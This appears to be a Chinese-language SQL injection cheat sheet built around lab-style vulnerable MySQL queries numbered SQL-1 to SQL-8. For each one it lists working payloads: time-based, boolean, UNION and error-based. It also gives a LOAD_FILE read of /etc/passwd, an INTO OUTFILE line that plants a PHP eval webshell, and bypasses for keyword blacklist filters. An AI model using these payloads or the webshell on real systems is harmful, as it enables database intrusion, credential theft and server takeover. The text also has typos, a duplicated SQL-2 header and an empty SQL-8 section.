#SQL—Injection
应用程序在向后台数据库传递SQLc查询时，如果为攻击者提供了影响该查询的能力，就会引起sql注入。简而言之就是程序代码在编写的时候没有对用户可控的变量进行合适的判断d和处理导致不可信数据被作为命令或是数据查询的一部分发送到用户客户端，导致漏洞的发生。
##Mysql注入
###Mysql数据库版本
 - show version(); < 5.0 没有information_schema数据库;
 - show version(); > 5.0 有内置information_schema数据库，可以快速查找表明;
 - show version(); > 5.5 有内置information_schema数据库和performance_schema数据库(用于收集数据库服务器性能参数)；  

###注释符
 - `#` `/*` `-- -` `;%00`  `` ` 
 - 值得注意：在Accsee数据库中没有注释符的存在，但是在一定条件下可以使用%00来代替注释符。

###注入方式
 - inband,利用攻击者和存在漏洞的wen程序之间现有的f通信方式来进行sql注入并提取数据，Union注入、报错注入(error-base)；
 - inference,通过传入不同的参数值来观察web程序表现的差异性来进行sql注入并提取数据，布尔值注入(bool)、时间注入(time-base)；
 - Out-of-inband，当现有的通信渠道不能提取数据d时，我们可以利用其他渠道来尝试提取数据，如e-mail、HTTP/DNS、文件系统；

###Mysql 读写文件
 - LOAD_FILE() 
    - SELECT LOAD_FILE('/etc/passwd');
    - Mysqlyd用户必须有文件读取的权利；文件大小要小于max_allowed_packet;
 - INTO OUTFILE()
   - SELECT '<?php eval($_REQUEST[\'s\']);>' INTO FILE '/var/www/1.php';
   - INTO OUTFILE不能覆盖已经存在的文件；

###常用函数
 - `@@VERSION()` `VERSION()` `current_user` `database()` `@@HOSTNAME`

##SQL
 - [SQL-1](#sql-1)
 - [SQL-2](#sql-2)
 - [SQl-3](#sql-3)
 - [SQl-4](#sql-4)
 - [SQL-5](#sql-5)
 - [SQl-6](#sql-6)
 - [SQl-7](#sql-7)
 - [SQl-8](#sql-8)


##<span id="SQL-2">SQL-2</span>
###mysql_query
 - `SELECT * FROM users WHERE id=1 LIMIT 0,1;`
###Payload
 - time-based blind 
    - `id=1 AND SLEEP(5) `
    - `id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Kevinsa)`
 - boolean-based blind 
    - `id=1 AND 6036=6036`
 - UNION query
    - `id=-3563 UNION ALL SELECT NULL,NULL,CONCAT()--`

##<span id="SQL-2">SQL-2</span>
对比于SQL-1的直接传值$id，SQL-2中在SQL-1注入Payload的基础上需要对y单引号`'`进行闭合；
###mysql_query
 - `SELECT * FROM users WHERE id='$id' LIMIT 0,1;`
###PayLoad
 - time-based blind 
    - `id=1' AND SLEEP(5) AND 'sql'='sql`
    - `id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))Kevinsa) and 'Kevinsa'='Kevinsa`
 - boolean-based blind 
    - `id=1' AND 6036=6036 AND 'Drgh'='Drgh`
 - UNION query
    - `id=-3563' UNION ALL SELECT NULL,NULL,CONCAT()-- Kevinsa'`

##<span id="SQL-3">SQL-3</span>
###mysql_query
 - `SELECT * FROM users WHERE id=($id) LIMIT 0,1;`
###Payload
 - time-based blind
    - `?id=1) AND SLEEP(5) AND (1=1# `
 - boolen-based blind
    - `?id=1) AND 1378=1379 AND ('ARzY'='ARzY'`

##<span id="SQL-4">SQL-4</span>
可以看到SQL-4与SQL-1是相类似的，在不需要闭合任何符合的情况下就可以进行SQL注入，但是在SQL-4中值得一提的是，SQL-4中开启了`mysql_error();`，r所以我们可以利用报错注入的方式来提取数据。
###mysql_query
 - ```
   $sql_query="SELECT * FROM users WHERE id=$id LIMIT 0,1";
   mysql_query($sql_query);
   echo mysql_error;
   ```

###Payload
 - error-based blind
    - `?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`
        - floor(rand(0)*2)、count(*)、group by，报错方式的原理是：使用rand()查询时，由于group by的存在floor(rand(0)*2)会被执行一次，当x虚拟表不存在时，插入虚拟表会被再执行一次，而报错正是因为floor(rand(0)*2)的确定性011；文章：Wooyun知识库-Mysql报错注入原理分析(count()、rand()、group by)
    - `id=1  and (extractvalue(1,concat(0x7e,(select user()),0x7e)))`
        - extractvalue是mysql5.1提供的内置XML文件解析和修改函数，函数语法为extratvalue(XML_document,XPath_string),其中的XML_document是string格式，而当我们传入一个数值时，extractvalue()函数会产生报错；
    - `id=1  and (updatexml(1,concat(0x7e,(select user()),0x7e),1))`
        - updatexml同样是mysql5.1中提供的内置xml文件解析和修改函数，函数语法为updatexml(XML_document,XPath_string,new_value),其中的XML_document是string格式，而当我们传入一个数值时，updatexml()函数会产生报错；

##<span id="SQL-5">SQL-5</span>
虽然SQL-5的csql查询方式和SQL-1一样，但是php代码中没有对结果的输出点，而且注入布尔值判断也不影响页面正常输出任何内容，所以我们只能利用time-based blind。
###mysql_query
 - `SELECT * FROM users WHERE id='$id' LIMIT 0,1; 
    /* echo mysql_query(); */`
###Payload
 - time-based blind 
    - `id=1 AND SLEEP(5) `
    - `id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Kevinsa)`

##<span id="SQL-6">SQL-6</span>
SQL-6对比与SQL-1多了一层粗糙的过滤，`function sqlentities()`以黑名单的方式对id参数值进行过滤。
###mysql_query
 - ```
   function sqlentities($var) {
    $var = str_replace("select"," ",$var);
	$var = str_replace("sleep"," ",$var);
	$var = str_replace("and"," ",$var);
	$var = str_replace("from"," ",$var);
	$var = str_replace("where"," ",$var);
	$var = str_replace("union"," ",$var);
	
	return $var;
	}

   ```
###Payload
最简单的方式，我们一大小写混淆来绕过过滤
- time-based blind 
    - `id=1 AND SLEEP(5) `
    - `id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Kevinsa)`
 - boolean-based blind 
    - `id=1 AND 6036=6036`
 - UNION query
    - `id=-3563 UNION ALL SELECT NULL,NULL,CONCAT()--`

##<span id="SQL-7">SQL-7</span>
相对于SQL-6，SQL-7匹配为大小写匹配，我们不能用大小写混淆来绕过过滤。
###mysql_quey
 -  ```
    function sqlentities($var) {
    $var = preg_replace('/(select|where|sleep|and|from|union)/i',"",$var);
	return $var;
	}
	}
  ```

###Payload
- time-based blind 
    - `id=1 ANandD SLandEEP(5) `
    - `id=1 AND (SELEandCT * FandROM (SandELECT(SLandEEP(5)))Kevinsa)`
 - boolean-based blind 
    - `id=1 ANandD 6036=6036`
 - UNION query
    - `id=-3563 UNandION ALL SELECandT NULL,NULL,CONCAT()--`

####<span id="SQL-8">SQL-8</span>
